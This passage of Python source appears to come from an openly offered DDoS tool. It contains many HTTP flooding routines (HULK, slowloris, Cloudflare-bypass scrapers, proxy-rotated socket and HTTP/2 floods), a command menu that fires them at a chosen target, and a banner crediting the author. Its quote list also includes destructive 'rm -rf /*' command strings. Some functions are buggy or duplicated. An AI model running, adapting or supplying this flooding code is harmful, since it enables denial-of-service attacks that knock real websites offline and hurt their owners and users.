    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass
#endregion
#hulk
def LaunchHULK(target, thread, t):
    target = get_target(target)
    user_agent = random.choice(useragents)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + target['url']+"?" + random.randint(1,1000) + "=" + random.randint(1,1000)+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackHULK, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackHULK(target, until_datetime, req):
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        ctx = ssl.create_default_context()
        cipher = (':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK')
        ctx.set_ciphers(cipher)
        s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion
#slowloris

def attackslow(target, thread, t):
    for i in range(int(thread)):
        threading.Thread(target=Launchslow, args=(target, t)).start()
        
def Launchslow(target, t):
    socksCrawler() 
    prox = open("./proxy.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(target).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            s.send(("Connection:keep-alive").encode("utf-8"))
            while True:
                time.sleep(14)
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except:
            s.close()
            Launchslow()
#endregion
#gbp
def attackbypass(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchbypass, args=(target, t)).start()

def Launchbypass(target, t):
    prox = open("./proxy.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
def attackSTELLAR(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(target, t)).start()

def LaunchSTELLAR(target, tr):
    timelol = time.time() + int(t) 
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

#region CFB
def LaunchCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
     for _ in range(100):
        try:
            scraper.get(target, timeout=5)
            scraper.post(target, timeout=5)
            scraper.head(target, timeout=5)
        except:
            pass
#endregion

#getCOOOKIE

def attackPXCFB(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchPXCFB, args=(target, t)).start()

def LaunchPXCFB(target, t):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(t)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.3\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.create_default_context()
            cipher = [':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK']
            ctx.set_ciphers(cipher)
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#region CFPRO
def LaunchCFPRO(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(targetl=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass
#endregion
#region
def LaunchCFSOC(target, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(target)
    cookie, user_agent = get_cookie(target)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target[4] == 's':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


#slowloris

# endregion

# region testzone
def attackSKY(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(target, t)).start()


def LaunchSKY(target, t):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(t)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(target).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            _=s.send(str.encode(req))
            try:
                for _ in range(100):
                    _=s.send(str.encode(req))
                    _=s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


def attackSTELLAR(target, thread, t):
    for i in range(int(thread)):
        threading.Thread(target=LaunchSTELLAR, args=(target, t)).start()

def LaunchSTELLAR(target, t):
    timelol = time.time() + int(t) 
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(target).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(target).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(target).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


# endregion

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(target)
    req = 'GET ' + target['target'] + ' HTTP/1.1\r\n'
    req += 'target: ' + target['target'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    # req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=test2, args=(until, target, req,))
            thd.start()
        except:
            pass


def test2(until_datetime, target, req):
    if target[4] == 's':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['target']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['target'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

def dos(target):
        while True:
          try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)

          except requests.exceptions.ConnectionError:

            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")


# endregion
def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')



# Fancy ASCII watermark
wms = [
  '''

               ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀
               █▀█ ░█░ ░█░ █▀█ █▄▄ █░█
  ''',
  

  '''

       ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
        ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
        ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
        ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
        ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
  ''',


  '''

        ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀
        █▀█ ░█░ ░█░ █▀█ █▄▄ █░█
  ''',

  '''                                         

░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝" 
  ''',


]

quotes = [
  # Author
  'ЕБИСЬ ОНО КОНЁМ СУКА',
  'Я ЗАЕБАЛСЯ ЭТО ВСЁ ФИКСИТЬ',
  'I\'m in your walls.',
  'I\'ve got your passwords!',
  'Stealing your cookies...',
  'You got ratted!',
  'Hacked by AuraNetz xD',
  'You may want to check your wallet right now :)',
  'Never trust anyone.',
  'Your worst nightmare:',
  'I\'ve dug two graves for us.',
  'This life is meaningless.',
  'I hate coding.',
  'Go outside, atleast once.',
  'Maybe it\'s time to shower?',
  'Don\'t forget to go to school!',
  'Hacking your local network...',
  f'Hey, {pcpy.get_user()}!',
  f'Welcome back, {pcpy.get_user()}!',
  'I hate my life. :P',
  '1100011110111111000111101011',
  'You are not my friend.',
  'We do not forget, we do not forgive.',
  'We are Legion!',
  'Subscribe to @Killnet_Jacky :D',
  'Do not skid ever!',
  '@Killnet_Jacky on top',
  'Bla-bla-bla...',
  'Don\'t ever skid!',
  ':)',
  f'Hello, {pcpy.get_user()}.',
  'Check out Minecraft also!',
  'Check out Terraria also!',
  'Положи своего друга!',
  'Boot your own friend!',
  'Заставь сис. администратора плакать!',
  'Make your system administrator cry!',
  'With love from Jacky <3',
  'Token-logging your Discord...',
  'Stealing Steam sessions...',
  'Bruteforcing your 2FA...',
  'Executing malware...',
  'Downloading WannaCry...',
  'А ну, выключай, уже поздно!',
  'Ха, с 1 апреля!',
  'https://t.me/Killnet_Jacky',
  'Закругляйся давай!',
  'Пошли в бравл-старс?',
  'Жи-ши, пиши от души!',
  'Заражаю всю сеть...',
  'Взламываю твой ВК...',
  'Брутфорсим твой телеграм...',
  'У меня пароль от твоей почты!',
  f'Ну что, {pcpy.get_user()}...',
  f'{pcpy.get_user()}, кыш!',
  'download l33t hacks 1337',
  'Скачать ддос без смс и регистрации',
  'rm -rf /* --no-preserve-root',
  'sudo rm -rf /*',


]


# Functions that replaces built-in ones
def printf(txt, delay=0, end='\n', flush=True):
  txt = txt + end
  
  for letter in txt:
    """
    sys.stdout.write(letter)
    if Flush:
      sys.stdout.flush()
    """

    print(letter, end='', flush=flush)
    
    time.sleep(delay)

def inputf():
    printf(Colorate.Vertical(Colors.purple_to_red, '''
  ╔═══[Chức năng cần sử dụng]
  ╚══> ''', True), end=' ')
    
    return input().strip().lower()

def clr():
  os.system('cls' if os.name=='nt' else 'clear')

# Main function
def welcome():
  clr()
  printf(Center.XCenter(Colorate.Vertical(Colors.blue_to_purple, f'''         
                  
                ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
                ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
                ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
                ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗
                ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
                ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

                     █▀█ █░█ █░█ █▀▀   █▄▀ █░█ ▄▀█ █▄░█ █▀▀
                     █▀▀ █▀█ █▄█ █▄▄   █░█ █▀█ █▀█ █░▀█ █▄█

                         DDos V1 By Nguyen Phuc Khang
                        ══╦════════════════════════╦══
                   ╔════════════╗╔════════════╗╔════════════╗
                   ║ attack     ║║ pxspoof    ║║ pxhttp2    ║
                   ║ attack2    ║║ pxslow     ║║ pxraw      ║
                   ║start attack║║ httpddos   ║║ http-god   ║        
                   ╚════════════╝╚════════════╝╚════════════╝
Thiết Bị Của Bạn : Windows
[+] Code by Nguyễn Phúc Khang
[+] Facebook :https://www.facebook.com/NPKhang.Developer.Coder
[+] Zalo :09088686000
 '''), True), end='')

  while True:
    cmdl = inputf()

    if 'credits' in cmdl:
      clr()
      
      printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''


      '''), True), end='')
    
    #elif 'fetch' in cmdl or 'info' in cmdl:
      #print(pcpy.fetch())
    elif 'help' in cmdl:
      clr()
      printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
╦
      {random.choice(wms)}
                                  — {random.choice(quotes)}
                                          

 '''), True), end='')
    elif 'methods' in cmdl:
      clr()
      
      printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''

        ➡ l4                   : tcp, udp, mine, vse, tcpcustom

        ➡ l7                   : attack, pxcfb, cfreq, cfsoc, 
                                 pxsky, sky, get, post, head, 
                                 pps, spoof, pxspoof, soc
                                 pxraw, pxsoc, cfpro, bypass, 
                                 stellar, httpddos, pxslow, hyper,
                                 raw,http2, attack2, http-by
                                 pass, pxhttp2                  

      '''), True), end='')
    elif 'tools' in cmdl:
        clr()
        printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
            
          {random.choice(wms)}


      '''), True), end='')
    elif 'layer7' in cmdl or 'l7' in cmdl:
        clr()
        print("")
        printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
      '''), True), end='')

    elif 'layer4' in cmdl or 'l4' in cmdl:
        clr()
        print("")
        printf(Center.XCenter(Colorate.Vertical(Colors.red_to_purple, f'''
      '''), True), end='')

    elif 'cls' in cmdl or 'clear' in cmdl:
        clr()
        welcome()

    elif 'root' in cmdl:
        global ip
        print(Back.GREEN+"Your ip: {}".format(ip)+Style.RESET_ALL)
        print(Back.GREEN+"Your ip is sent to the server." + Style.RESET_ALL)


    elif 'help' in cmdl:
        clr()
        help()

    elif 'attack' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif "pxcfb" in cmdl or 'PXCFB' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
            
    elif "pps" in cmdl or 'PPS' in cmdl:
        target, thread, t = get_info_l7()
        
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join()
    elif "spoof" in cmdl or 'SPOOF' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    elif "pxspoof" in cmdl or "PXSPOOF" in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        timer.join()
        time.sleep(1000)
    elif 'tcpcustom' in cmdl:
        target, port, thread, t = get_info_l4()
        tcpcustom(target, port, thread, t)
    elif 'http-bypass' in cmdl:
         target = get_ddos_pro()
         httpbypass(target)
    elif 'attack2' in cmdl:
        target, method = get_hulk_pro()
        attack2(target, method)
    elif 'get' in cmdl or 'GET' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackRAW, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'post' in cmdl or 'POST' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackPOST, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'head' in cmdl or 'HEAD' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackHEAD, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'pxraw' in cmdl or 'PXRAW' in cmdl:
